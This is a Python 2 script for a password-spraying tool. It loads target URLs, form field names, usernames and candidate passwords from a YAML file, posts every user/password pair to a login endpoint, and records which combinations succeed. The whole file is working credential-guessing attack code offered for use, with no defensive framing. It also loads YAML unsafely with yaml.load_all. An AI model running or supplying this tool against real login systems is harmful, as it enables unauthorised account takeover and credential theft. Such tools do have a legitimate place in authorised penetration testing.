import requests
import json
import yaml


class PasswordSprayer():
    """"
    Class that takes input from
    a YAML file and then attempts to
    ascertain if a user account is
    valid on target application
    """

    valid_logins = {'users_pwd':[]}
    invalid_logins = {'users_pwd':[]}
    yamldump = {}
    user_field = ""
    password_field = ""
    data = {}
    url = ""
    response_key = ""
    valid_response = ""

    def __init__(self):
        """
        Kick off the application
        """
        self.load_yaml()
        self.load_params()
        self.dump_yaml_output()


    def load_yaml(self):
        """"
        Load params from
        a YAML document
        """
        opendoc = open("users.yaml", "r")
        self.yamldump = yaml.load_all(opendoc)


    def load_params(self):
        """
        Load parameters
        from yamldump
        """ 
        
        for key in self.yamldump:
        
            self.data = {}
            self.user_field = key['user_field']
            self.password_field = key['password_field']
            self.response_key = key['response']['response_key']
            self.valid_response = key['response']['valid_response']
            self.url = key['url']
            self.data[self.user_field] = ""
        
            if key['data'] and key['data'] != None:
                data_vals = key['data']
                for k in data_vals:
                    self.data[k] = data_vals[k]
            
            if key['users'] and key['passwords']: 
                users_list = key['users']
                passwords_list = key['passwords'] 
                self.check_for_valid_logins(users_list, passwords_list) 
 


    def check_for_valid_logins(self, users_list, passwords_list):
        """
        Using input parameters
        test target url/api
        with user + password
        to see if valid login
        """         
        
        
        for u in users_list:
        
            self.data[self.user_field] = u

            for p in passwords_list:

                self.data[self.password_field] = p

                print "Trying password " + str(p)
                print "For user " + str(u)
                r = requests.post(self.url, data=self.data) 
        
                dictdata = json.loads(r.text)

                if dictdata[self.response_key] == self.valid_response: 
            
                    print "Status code is: "+str(r.status_code) 
                    print "Response message is: "+str(r.reason)
                    print "Valid password: "+p 
                    self.valid_logins['users_pwd'].append({'user':u,'password':p})
                    break
 
                else:
                    print "Response message is: "+str(dictdata[self.response_key])
                    self.invalid_logins['users_pwd'].append({'user':u,'password':p})
        

    def dump_yaml_output(self):
        """
        Dump a lsit of valid and
        invalid login attempts to two separate
        docs
        """
        valid_logins_doc = file('valid_logins.yaml', 'w')
        yaml.dump(self.valid_logins, valid_logins_doc, default_flow_style=False)
        
        invalid_logins_doc = file('invalid_users.yaml', 'w')
        yaml.dump(self.invalid_logins, invalid_logins_doc, default_flow_style=False)
